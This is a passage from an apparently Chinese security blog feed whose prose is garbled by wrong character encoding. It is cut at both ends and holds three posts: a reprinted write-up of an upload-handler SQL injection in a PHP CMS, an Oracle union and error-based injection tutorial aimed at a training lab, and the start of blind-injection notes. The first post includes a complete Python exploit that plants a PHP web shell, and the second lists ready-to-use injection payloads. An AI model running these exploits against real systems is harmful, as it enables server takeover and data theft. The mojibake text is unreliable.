æˆ–è€…insertæ³¨å…¥ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä¼šæƒ³åŠæ³•å°†è¿™ä¸ªæ³¨å…¥å‡çº§ä¸€ä¸‹å±å®³ã€‚æ³¨æ„è¿™ä¸ªæ³¨å…¥æ˜¯ä¸€ä¸ªinsertæ³¨å…¥ï¼Œå¹¶ä¸”insertè¯­å¥æ˜¯å¯ä»¥ä¸€æ¬¡æ’å…¥å¤šæ¡å†…å®¹çš„ï¼Œæˆ‘ä»¬ä¸èƒ½æ§åˆ¶å½“å‰è¿™æ¡insertè¯­å¥çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸‹ä¸€æ¡çš„å†…å®¹ï¼Œæ¯”å¦‚è¯´åƒè¿™æ ·:<br>Insert into file values(1,2,3,),(4,5,6)<br>é‚£ä¹ˆæˆ‘ä»¬æ§åˆ¶ä¸‹ä¸€æ¡çš„å†…å®¹æœ‰ä»€ä¹ˆç”¨ï¼Œå¥½ï¼Œç°åœ¨æˆ‘ä»¬å¼€å§‹çœ‹/framework/www/upload_control.phpä¸­çš„ç¬¬103è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;æ²¡æœ‰æŒ‡å®šè¦æ›¿æ¢çš„é™„ä»¶&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;èµ„æºä¸å­˜åœ¨&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;é™„ä»¶ä¸Šä¼ å¤±è´¥&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //æ›¿æ¢èµ„æº</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //æ›´æ–°é™„ä»¶æ‰©å±•ä¿¡æ¯</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªoldidçš„å€¼ï¼Œç„¶åä»resè¡¨ä¸­æŸ¥æ‰¾å‡ºè¿™ä¸€è¡Œçš„æ•°æ®ï¼Œç„¶åå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶mvåˆ°$old_rs[â€˜filenameâ€™]ã€‚<br>mvå‡½æ•°çš„å®šä¹‰åœ¨/framework/libs/file.phpä¸­ç¬¬264è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šæ–‡è¯´åˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶resè¡¨ä¸­çš„ä¸€è¡Œè®°å½•çš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªfilenameä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœå°†filenameè®¾ç½®ä¸º/res/balisong.phpã€‚é‚£ä¹ˆæˆ‘ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶å°±ä¼šé‡æ–°å‘½åæˆ/res/balisong.phpã€‚æˆ‘ä»¬å°±è¾¾åˆ°äº†ä¸€ä¸ªgetshellçš„ç›®çš„ã€‚</p><p>ç”±äºä¸Šä¼ çš„æ–‡ä»¶åçš„ç‰¹æ®Šæ€§ã€‚å¯¼è‡´æˆ‘ä»¬ä¸èƒ½å¸¦æœ‰æ–œæ ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶ç¼–ç æ¥ç»•è¿‡ï¼Œå…·ä½“çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹å°±ä¸ç»†è¯´äº†ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šexpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿé»˜è®¤æ˜¯ä¸éœ€è¦æ³¨å†Œç™»å½•å³å¯ä¸Šä¼ æ–‡ä»¶çš„ã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å…¶å®è¿™ç§æƒ…å†µè¿˜æ˜¯è›®å¤šçš„ï¼Œæœ‰äº›ç³»ç»Ÿä¼šå°†ä¸Šä¼ å‰çš„æ–‡ä»¶åå…¥åº“ï¼Œå¦‚æœè¿‡æ»¤ä¸å½“ï¼Œå°±å¯ä»¥æ³¨å…¥äº†ã€‚å¹¶ä¸”insertï¼Œupdateè¿™ç§æ³¨å…¥å±å®³æ˜¯å¯ä»¥è¿›ä¸€æ­¥æ‰©å¤§çš„ã€‚</p><p>è½¬è½½äº<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracleæ³¨å…¥-æŠ¥é”™æ³¨å…¥</title>
      <link href="/2019/12/07/oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle-æŠ¥é”™æ³¨å…¥"><a href="#Oracle-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Oracle æŠ¥é”™æ³¨å…¥"></a>Oracle æŠ¥é”™æ³¨å…¥</h2><p>è¿›è¡Œæµ‹è¯•æˆ–æ¼æ´æŒ–æ˜çš„æ—¶å€™å‘ç°å‡ºç°äº†æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥ä¼˜å…ˆé€‰æ‹©æŠ¥é”™æ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥å°±æ˜¯ä½¿ç”¨æŠ¥é”™çš„æ–¹å¼å°†æŸ¥è¯¢æ•°æ®çš„ç»“æœå¸¦å‡ºåˆ°é”™è¯¯é¡µé¢ä¸­ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥éœ€è¦ä½¿ç”¨ç±»ä¼¼ 1=[æŠ¥é”™è¯­å¥]ï¼Œ1&gt;[æŠ¥é”™è¯­å¥]ï¼Œä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦ï¼Œè¿™æ ·çš„æ–¹å¼è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼ˆMYSQLä»…ä½¿ç”¨å‡½æ•°æŠ¥é”™å³å¯ï¼‰</p><h2 id="æ³¨å…¥å°æç¤º"><a href="#æ³¨å…¥å°æç¤º" class="headerlink" title="æ³¨å…¥å°æç¤º"></a>æ³¨å…¥å°æç¤º</h2><ul><li>Oracle ä½¿ç”¨æŸ¥è¯¢è¯­å¥è·å–æ•°æ®æ—¶éœ€è¦è·Ÿä¸Šè¡¨å</li><li>æ²¡æœ‰è¡¨çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨dualï¼Œdualæ˜¯Oracleçš„è™šæ‹Ÿè¡¨ï¼Œç”¨æ¥æ„æˆselectçš„è¯­æ³•è§„åˆ™.</li><li>Oracleä¿è¯dualé‡Œé¢æ°¸è¿œåªæœ‰ä¸€æ¡è®°å½•ã€‚</li><li>å¡«å……å­—æ®µæ•°è¦ç”¨nullå¡«å……</li><li>Oracleçš„å•è¡Œæ³¨é‡Šç¬¦å·æ˜¯â€“</li></ul><p>oracleæ³¨å…¥æˆ‘ä»¬é¦–å…ˆæƒ³åˆ°çš„æ˜¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š</p><h2 id="oracleè”åˆæŸ¥è¯¢çš„æ³¨å…¥æ­¥éª¤ï¼š"><a href="#oracleè”åˆæŸ¥è¯¢çš„æ³¨å…¥æ­¥éª¤ï¼š" class="headerlink" title="oracleè”åˆæŸ¥è¯¢çš„æ³¨å…¥æ­¥éª¤ï¼š"></a>oracleè”åˆæŸ¥è¯¢çš„æ³¨å…¥æ­¥éª¤ï¼š</h2><ul><li>åˆ¤æ–­å­—æ®µæ•°(ä¸€äº›é—­åˆæ³¨é‡Š)ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order by 4--</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡æµ‹è¯•æ•°æ®ç±»å‹æ¥åˆ¤æ–­å›æ˜¾ä½ç½®(å‘ç°å¯è¾“å‡ºå­—ç¬¦ä¸²çš„ä¸º2,3,4ä¸ªå­—æ®µ)ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union all select null,&apos;null&apos;,&apos;null&apos;,&apos;null&apos; from dual--</span><br></pre></td></tr></table></figure><ul><li>è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select banner from  sys.v_$version where rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>è·å–è¡¨å:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select table_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>è·å–å…³é”®è¡¨ä¸­çš„åˆ—å(æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>and å­—æ®µå&lt;&gt;å­—æ®µå€¼</strong>æ¥æ’é™¤ä¸æƒ³è¦çš„å­—æ®µåï¼Œå°±æ˜¯è¯´å°† å­—æ®µå=æŒ‡å®šå­—æ®µå€¼è¿›è¡Œæ’é™¤)ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where rownum=1),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos;),null from dual --</span><br></pre></td></tr></table></figure><p>é€šè¿‡é€æ­¥æ’é™¤æ¥å¾—åˆ°è‡ªå·±æ‰€æƒ³è¦çš„å­—æ®µåï¼›</p><ul><li>å†è·å–å…³é”®å­—æ®µä¸­çš„å­—æ®µæ•°æ®</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select FLAG_FLAG from admin --</span><br></pre></td></tr></table></figure><h2 id="oracle-æŠ¥é”™æ³¨å…¥"><a href="#oracle-æŠ¥é”™æ³¨å…¥" class="headerlink" title="oracle æŠ¥é”™æ³¨å…¥"></a>oracle æŠ¥é”™æ³¨å…¥</h2><ul><li>CTXSYS.DRITHSX.SN()</li></ul><p>å»æŸ¥è¯¢å…³äºä¸»é¢˜çš„å¯¹åº”å…³é”®è¯ï¼Œç„¶åå› ä¸ºæŸ¥è¯¢å¤±è´¥ï¼ˆåº”è¯¥æ˜¯è¿™ä¸ªç”¨æˆ·æ²¡æœ‰åˆ›å»ºå’ŒæŸ¥è¯¢çš„æƒé™ï¼Œé»˜è®¤æƒ…å†µæ²¡æœ‰åˆ›å»ºï¼Œçˆ†å‡ºæœªæŸ¥è¯¢åˆ°çš„é”™è¯¯ä»è€Œçˆ†å‡ºæŸ¥è¯¢å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°å°†æŸ¥è¯¢å†…å®¹é€šè¿‡æŠ¥é”™çˆ†å‡ºæŸ¥è¯¢å†…å®¹ï¼›</p><ul><li>oracleæ³¨å…¥çš„ä¸€äº›æ•°æ®åº“è¯­å¥ï¼š</li></ul><p>select bannner from sys.v_$version where rownum=1     æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ï¼›</p><p>select table_name from user_tables where rownum=1  æŸ¥è¯¢è¡¨åï¼›</p><p>select column_name from user_tab_columns where table_name=â€™ADMINâ€™ and rownum=1  æŸ¥è¯¢å­—æ®µåï¼›</p><p>select [å­—æ®µ] from [è¡¨å]  æŸ¥è¯¢å†…å®¹ï¼›</p><p>select * from all_table æŸ¥è¯¢å‡ºæ‰€æœ‰è¡¨ï¼›</p><p>select * from user_tables æŸ¥è¯¢å‡ºå½“å‰ç”¨æˆ·çš„è¡¨ï¼›</p><p>select * from all_tab_columns  æŸ¥è¯¢æ‰€æœ‰çš„å­—æ®µï¼›</p><p>select * from user_tab_columns æŸ¥è¯¢å½“å‰ç”¨æˆ·çš„å­—æ®µï¼›</p><h2 id="oracle-æŠ¥é”™æ³¨å…¥çš„æ­¥éª¤ï¼š"><a href="#oracle-æŠ¥é”™æ³¨å…¥çš„æ­¥éª¤ï¼š" class="headerlink" title="oracle æŠ¥é”™æ³¨å…¥çš„æ­¥éª¤ï¼š"></a>oracle æŠ¥é”™æ³¨å…¥çš„æ­¥éª¤ï¼š</h2><ul><li>é—­åˆæ³¨é‡Šè¯­å¥ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos;--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢è¡¨åï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢é™¤IDå¤–çš„å­—æ®µï¼Œå¹¶è¿”å›ä¸€è¡Œç»“æœï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢é™¤IDã€USER_NAMEå¤–çš„å­—æ®µï¼Œå¹¶è¿”å›ä¸€è¡Œç»“æœï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢é™¤IDã€USER_NAMEã€PASSWORDå¤–çš„å­—æ®µï¼Œå¹¶è¿”å›ä¸€è¡Œç»“æœï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢åˆ°æˆ‘ä»¬éœ€è¦çš„å­—æ®µFLAG_FLAG</li></ul><ul><li>æŸ¥è¯¢å­—æ®µå†…å®¹ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select FLAG_FLAG from ADMIN where rownum=1))--</span><br></pre></td></tr></table></figure></li></ul><p>æœ€åå¯ä»¥æˆåŠŸæŸ¥è¯¢åˆ°æˆ‘ä»¬æƒ³çŸ¥é“çš„å­—æ®µå†…å®¹ï¼</p><h3 id="å¸¸ç”¨çš„ä¸€äº›æŠ¥é”™å‡½æ•°ï¼š"><a href="#å¸¸ç”¨çš„ä¸€äº›æŠ¥é”™å‡½æ•°ï¼š" class="headerlink" title="å¸¸ç”¨çš„ä¸€äº›æŠ¥é”™å‡½æ•°ï¼š"></a>å¸¸ç”¨çš„ä¸€äº›æŠ¥é”™å‡½æ•°ï¼š</h3><ul><li>utl_inaddr.get_host_name()</li><li>ctxsys.drithsx.sn()</li><li>XMLType()</li><li>dbms_xdb_version.checkin()</li><li>dbms_xdb_version.makeversioned()</li><li>dbms_xdb_version.uncheckout()</li><li>dbms_utility.sqlid_to_sqlhash()</li><li>ordsys.ord_dicom.getmappingxpath()</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlç›²æ³¨</title>
      <link href="/2019/12/07/mysqlmanzu/"/>
      <url>/2019/12/07/mysqlmanzu/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlç›²æ³¨ä»‹ç»"><a href="#sqlç›²æ³¨ä»‹ç»" class="headerlink" title="sqlç›²æ³¨ä»‹ç»"></a>sqlç›²æ³¨ä»‹ç»</h2><p>ä½•ä¸ºç›²æ³¨ï¼Ÿç›²æ³¨å°±æ˜¯åœ¨ sql æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œsql è¯­å¥æ‰§è¡Œçš„é€‰æ‹©åï¼Œé€‰æ‹©çš„æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ï¼Œè€Œå¯¹äºæ”»å‡»è€…æ¥è¯´ä¹Ÿç¼ºå°‘äº†éå¸¸é‡è¦çš„â€œè°ƒè¯•ä¿¡æ¯â€ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ã€‚</p><ul><li><strong>å¸ƒå°”ç›²æ³¨ï¼š</strong></li></ul><p>å¸ƒå°”ç›²æ³¨ï¼Œé¡¾åæ€ä¹‰ï¼Œåªæœ‰Tureå’ŒFalseï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªä¼šæ ¹æ®ä½ çš„æ³¨å…¥ä¿¡æ¯è¿”å›Tureè·ŸFalseï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä¼šå†æ˜¾ç¤ºä¹‹å‰çš„æ˜¾é”™ä¿¡æ¯äº†ã€‚(æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€»è¾‘åˆ¤æ–­è¿›è¡Œæˆªå–å­—ç¬¦ä¸²ï¼‰</p><ul><li><strong>æ—¶é—´ç›²æ³¨</strong></li></ul><p>ç•Œé¢è¿”å›å€¼åªæœ‰ä¸€ç§ç»“æœtureï¼Œæ— è®ºè¾“å‡ºä»»ä½•å€¼,è¿”å›æƒ…å†µéƒ½ä¼šæŒ‰tureå€¼æ¥è¿”å›æ­£å¸¸é¡µé¢ï¼Œæ³¨å…¥çš„æ–¹æ³•å…¶å®å°±æ˜¯åœ¨å¸ƒå°”ç›²æ³¨çš„æ³¨å…¥æ–¹å¼ä¸­åŠ å…¥äº†ifåˆ¤æ–­ï¼Œå¹¶é€šè¿‡æŸ¥çœ‹webé¡µé¢è¿”å›æ—¶é—´å·®æ¥åˆ¤æ–­æ³¨å…¥çš„è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</p><h2 id="å¸¸ç”¨ç›²æ³¨å‡½æ•°"><a href="#å¸¸ç”¨ç›²æ³¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨ç›²æ³¨å‡½æ•°"></a>å¸¸ç”¨ç›²æ³¨å‡½æ•°</h2><ul><li><p>lengthï¼ˆï¼‰å‡½æ•° è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</p></li><li><p>substrï¼ˆï¼‰å‡½æ•° æˆªå–å­—ç¬¦ä¸² </p></li><li><p>asciiï¼ˆï¼‰ è¿”å›å­—ç¬¦ä¸²çš„asciiç </p></li><li><p>sleepï¼ˆnï¼‰å°†ç¨‹åºæŒ‚èµ·ä¸€æ®µæ—¶é—´ï¼Œnä¸ºnç§’</p></li><li><p>ifï¼ˆexpr1ï¼Œexpr2ï¼Œexpr3ï¼‰åˆ¤æ–­è¯­å¥ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¯­å¥æ­£ç¡®å°±æ‰§è¡Œç¬¬äºŒä¸ªï¼Œå¦‚æœé”™è¯¯ï¼Œå°±æ‰§è¡Œç¬¬ä¸‰ä¸ªè¯­å¥ï¼›</p></li></ul><h3 id="å¸ƒå°”ç›²æ³¨ä¸€èˆ¬æµç¨‹ï¼š"><a href="#å¸ƒå°”ç›²æ³¨ä¸€èˆ¬æµç¨‹ï¼š" class="headerlink" title="å¸ƒå°”ç›²æ³¨ä¸€èˆ¬æµç¨‹ï¼š"></a>å¸ƒå°”ç›²æ³¨ä¸€èˆ¬æµç¨‹ï¼š</h3><h4 